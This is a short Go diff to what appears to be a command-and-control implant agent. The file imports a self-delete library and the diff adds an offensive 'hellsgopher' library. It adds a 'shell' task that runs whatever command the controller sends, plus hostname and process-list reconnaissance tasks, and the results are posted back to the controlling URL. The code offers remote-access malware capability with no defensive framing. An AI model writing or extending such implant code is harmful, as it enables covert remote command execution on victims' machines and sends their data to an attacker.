@@ -10,6 +10,7 @@ import (
 	"os"
 	"strings"
 
+	hg "github.com/deranged0tter/hellsgopher"
 	selfdelete "github.com/secur30nly/go-self-delete"
 )
 
@@ -19,13 +20,19 @@ func ExecTasks(tasksToDo []string, url string, sleep *int, agentid string, usera
 
 		taskSplit := strings.Split(task, " - ")
 		task = taskSplit[0]
-		// taskData := taskSplit[1]
+		taskData := taskSplit[1]
 
 		fmt.Println(task)
 
 		switch task {
+		case "shell":
+			data, _ = hg.PsReturn(taskData)
 		case "whoami":
 			data, _ = initialization.GetUsername()
+		case "hostname":
+			data, _ = hg.GetHostname()
+		case "ps":
+			data, _ = hg.PsReturn("tasklist")
 		}
 
 		rawJsonData := tasks.HttpTaskPostRequest{
